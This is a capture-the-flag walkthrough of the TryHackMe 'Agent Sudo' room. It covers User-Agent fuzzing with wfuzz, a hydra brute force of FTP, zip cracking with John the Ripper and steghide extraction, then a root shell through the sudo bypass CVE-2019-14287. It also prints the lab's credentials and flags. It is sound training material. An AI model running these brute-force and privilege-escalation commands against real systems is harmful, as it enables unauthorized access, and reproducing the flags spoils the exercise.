# Agent Sudo

I wasn't going to write this one up, but I actually used a broad variety of techniques with it which was fun and worth documenting for future reference.

1. nmap revealed that there were three ports: 21, 22 and 80
2. the website said 'send your agent codename as the user-agent to get redirected to your message' or something

    it took me slightly longer than it should have to work out this would be something in the range of A-Z - the reason being when I tried A, B, C etc in the user agent `curl` was just returning the text again (I used `curl -A "[agent string]" http://[ip address]` for reference)

    I set up burp with a [names list from seclists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt) but as it was free, this was taking ages.

    Instead, I explored using wfuzz for this, and it worked! well, didn't get the password, but did figure out how to use wfuzz for this sort of thing rather than the much slower intruder. It ran through all the names in under ten seconds, compared to free burp intruder which was barely halfway through the 'A's:

    `wfuzz -w names.txt -H "User-Agent: FUZZ" --hc 200 http://10.10.21.35/`

    At this point I realised that it would be letters, not names, so I nano'ed up a file with A to Z in it, ran the above using letters.txt, and found a 302 for `C`

    Curling with C was how I worked out where I had gone wrong from before, as the output was no different. I used burp instead, but I could also have used `curl -A "C" -I 10.10.21.35` to retrieve the headers with `-I`. This contained the redirect url: `agent_C_attention.php`

3. On that page was the full name `chris`, and an admonishment about having a weak ftp password. `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.21.35` produced the password `crystal`.

4. On the ftp server were three files, two images and a text file. The text file said the real image was in my directory, presumably over ssh, and that the password was in some of the files (and presumably the username for Agent J, as the message was from Agent C to J)

    I spent a bit messing about with steghide and stegcracker here, thinking I had to bruteforce the jpg password. But stegcracker is a pain to install and very, very slow. Not practical.

    For reference, stegcracker is best installed with pip. Kali by default doesnt have pip so:

    ```
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
    python3 get-pip.py
    pip3 install stegcracker
    ```

5. `strings` against the second image, cute-alien.png, showed it contained To_agentR.txt inside it. But it wasn't a steg image. `binwalk cute-alien.png` showed it contained a zip file, so I used `binwalk -e cute-alien.png` to produce four files, including `8702.zip`

6. `zip2john 8702.zip > 8702.john` and `john 8702.john -w /usr/share/wordlists/rockyou.txt` revealed the passphrase to the zip: `alien`. I used this with `7z x 8702.zip` to get the contents, `To_AgentR.txt`

7. To_AgentR.txt said something like "we need to send the message to agent 'QXJlYTUx' as soon as possible!". `echo QXJlYTUx | base64 -d` revealed `Area51`

8. Back to the second of the two images retrieved from ftp, `steghide extract -sf cutie.jpg` with Area51 as the passphrase revealed message.txt, containing text to the effect of "hi james your password is `hackerrules!`"

9. ssh'ing onto the machine as james, the user flag `b03d975e8c92a7c04146cfa7a5a313c7` and an image is in the home dir. I pulled down the image via `scp`, then used `python3 -m http.server` to serve the image so I could view it on my host (I was using kali as an attacker machine, but only over ssh). I downloaded the image, and did a google reverse image search to get the 'name' of the image, specifically `roswell alien autopsy`.

10. sudo -l gave me something I haven't seen before: `(ALL, !root) /bin/bash`. I can use bash with sudo, but not as root. E.g. `sudo -u chris /bin/bash`, which switched me to a chris shell.

    I was a bit stuck at this point. The next step required finding a CVE, but that required finding a flaw. Given the sudo -l above, I knew it was something to do with that, especially given the room name. Ultimately the key was to search on the specific string, picking up a particularly nasty vulnerability from last year.

11. `CVE-2019-14287` targets versions of sudo up to 1.8.27. The version on the machine was (via `sudo -V`): `1.8.21p2`. With this, a simple `sudo -u#-1 /bin/bash` got me a root shell.

```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```